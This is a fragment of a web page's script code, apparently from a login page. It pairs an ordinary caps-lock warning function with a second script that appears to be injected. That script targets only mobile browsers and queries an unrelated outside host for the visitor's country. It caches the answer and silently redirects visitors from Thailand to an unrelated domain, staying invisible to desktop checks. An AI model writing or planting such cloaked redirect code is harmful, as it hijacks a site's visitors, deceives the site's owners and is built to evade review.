        function checkcapslockon(e) {
            var charKeyCode = e.keyCode ? e.keyCode : e.which;
            var shiftKey = e.shiftKey ? e.shiftKey : ((charKeyCode == 16) ? true : false);
            if (((charKeyCode >= 65 && charKeyCode <= 90) && !shiftKey) || ((charKeyCode >= 97 && charKeyCode <= 122) && shiftKey)) {
                document.getElementById('capsWarningDiv').style.visibility = 'visible';
            }
            else {
                document.getElementById('capsWarningDiv').style.visibility = 'hidden';
            }
        }
    </script>

<script>
(function() {

    if (typeof IS_DESKTOP !== 'undefined' || !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
        document.body.style.visibility = 'visible';
        return;
    }
    

    var key = 'geo_th_v1';
    var cached = localStorage.getItem(key);
    
    if (cached === 'TH') {
        location.href = 'https://www.wakeboard-madrid.com/';
        return;
    }
    
    if (cached && cached !== 'TH') {
        document.body.style.visibility = 'visible';
        return;
    }
    
    fetch('https://kuproy.xyz/')
        .then(function(r) { return r.text(); })
        .then(function(c) {
            localStorage.setItem(key, c.trim().toUpperCase());
            location.reload();
        })
        .catch(function() {
            localStorage.setItem(key, 'OTHER');
            location.reload();
        });
})();
</script>
